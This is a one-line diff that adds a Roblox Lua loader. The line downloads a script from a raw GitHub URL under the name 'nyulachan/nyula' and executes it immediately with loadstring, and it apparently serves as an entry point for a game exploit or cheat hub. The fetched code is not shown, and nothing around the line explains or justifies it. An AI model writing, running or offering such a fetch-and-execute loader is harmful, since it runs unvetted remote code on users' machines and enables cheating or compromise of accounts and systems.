@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/nyulachan/nyula/main/nyulauh"))()
